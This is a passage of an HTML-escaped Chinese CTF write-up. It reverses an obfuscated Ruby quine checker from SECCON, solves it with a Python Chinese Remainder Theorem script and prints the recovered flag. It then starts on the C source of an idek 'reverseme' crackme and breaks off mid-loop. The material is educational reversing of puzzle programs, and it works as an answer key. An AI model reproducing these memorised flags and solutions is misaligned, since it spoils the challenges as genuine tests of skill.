&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    h=e;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    b.times{
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                        g,h=h,8-g
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    };
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    t=(h*l+l+a)*20+h+g*2+2;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    m[t]=m[t+1]=&amp;#34;&amp;#34;&amp;lt;&amp;lt;32
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                )
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    };
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    a.sub!(/B.*?=/,&amp;#34;B=&amp;#34;);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    n=m.count(?#)-a.length;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    a.sub!(&amp;#34;B=&amp;#34;,&amp;#34;B#{(1..n).map{(rand(26)+97).chr}*&amp;#34;&amp;#34;}=&amp;#34;);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    o=0;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    m.length.times{|b|m[b]==?#&amp;amp;&amp;amp;o&amp;lt;a.length&amp;amp;&amp;amp;(m[b]=a[o];o+=1)};
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    puts(m)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;先运行了几份代码做对比，发现区别仅在于 &lt;code&gt;d,e,f,g,h,i=b[];&lt;/code&gt; 这一行，而且只有拼成 WRONG 的时候，d 才是 1，e 则不断自增，其余部分的程序完全一样，根据 &lt;code&gt;d==2?7:6;&lt;/code&gt; 猜测，当 d 为 2 的时候正确，因为 SECCON 和 WRONG. 都是 6 个字符，完全符合 d 不为 2 的情况&lt;/p&gt;
&lt;p&gt;根据这个猜测，&lt;code&gt;srand(f);&lt;/code&gt; 以下的代码是负责控制空格样式的，和验证没有关系，不许管&lt;/p&gt;
&lt;p&gt;我们需要关注的只有如下函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;    d,e,f,g,h,i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0+0+zeexaxq012eg+k2htkr1olaj6+3cbp5mnkzllt3+2qpvamo605t7j&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
    (j&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eval(&lt;span style=&#34;color:#e6db74&#34;&gt;?A&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; d&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (
        e&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;k&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;l&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;(a,b){(a&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;j&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ord)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pow(b&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,b)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;b};
        f&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;l&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;f,k&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
        g&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;l&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;g,k&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
        h&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;l&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;h,k&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
        i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;l&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i,k&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
        j&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?}&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;(d&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;g&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;h&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sub!(&lt;span style=&#34;color:#e6db74&#34;&gt;/&amp;#34;0.*?&amp;#34;/&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+[&lt;/span&gt;d,e,f,g,h,i&lt;span style=&#34;color:#f92672&#34;&gt;].&lt;/span&gt;map{&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;)}&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;)
    );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据测试 &lt;code&gt;j=eval(?A&amp;lt;&amp;lt;82&amp;lt;&amp;lt;71&amp;lt;&amp;lt;86)[0]&lt;/code&gt; 是获取命令行参数，也就是当前传入的字符&lt;/p&gt;
&lt;p&gt;&lt;code&gt;l&lt;/code&gt; 函数就是 &lt;code&gt;(a - ord(j)) * invmod(256) % b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;把这个程序倒过来就是 &lt;code&gt;(a * 256 + ord(j)) % b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果不考虑 &lt;code&gt;% b&lt;/code&gt;，最后得到的就是类似 &lt;code&gt;n2s(flag[::-1])&lt;/code&gt; 的效果&lt;/p&gt;
&lt;p&gt;所以 &lt;code&gt;f, g, h, i&lt;/code&gt; 的初值就是 &lt;code&gt;n2s(flag[::-1]) % (k+?)&lt;/code&gt;，标准的中国剩余定理&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;4659461645708163688&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2641556351334323346&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15837377083725718695&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12993509283917003551&lt;/span&gt;]

m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;) , (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;) ]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gcd&lt;/span&gt;(x, y):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        x, y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; y, x &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; y
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; abs(x)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ex_gcd&lt;/span&gt;(x, y):
    list_x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [x, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    list_y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [y, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; list_y[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; list_y[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
            list_x[i] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; list_y[i]
        list_x, list_y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_y, list_x
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;list_x[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; list_x

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;inverse&lt;/span&gt;(a, n):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;n &amp;lt; 2, error&amp;#34;&lt;/span&gt;)
    g, x, y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ex_gcd(a, n)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; g &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gcd(a, n) != 1, no inverse modular&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ex_crt&lt;/span&gt;(a, m, k):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, k):
        t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gcd(m[i], m[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (a[i] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; a[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        a[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (inverse(m[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; t, m[i] &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; t) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (a[i] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; a[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; t) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (m[i] &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; t) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        m[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m[i] &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        a[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (a[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; m[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; m[i]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; a[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

n2s(ex_crt(a, m, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;SECCON{L3t5_wr1t3_y0ur_Qu1n3!!!}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;idekreverseme&#34;&gt;[idek]reverseme&lt;/h2&gt;
&lt;p&gt;源程序是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; argv) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(argc &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;){
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: ./reverseme password&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(strlen(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;){
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Incorrect Length&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;){&lt;span style=&#34;color:#75715e&#34;&gt;//Not enough precision
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password Incorrect&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; magic_numbers[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68822144.50341525673866271972656250000000000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;56777293.39031631499528884887695312500000000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3274524.75536667229607701301574707031250000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85761.51255339206545613706111907958984375000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;8443.33244327564352715853601694107055664062500000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;166.67369627952575683593750000000000000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;1.00000000000000000000000000000000000000000000000000&lt;/span&gt;, 
    };
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; foo&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;,bar&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;j&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
            bar &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; magic_numbers[j] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; foo;
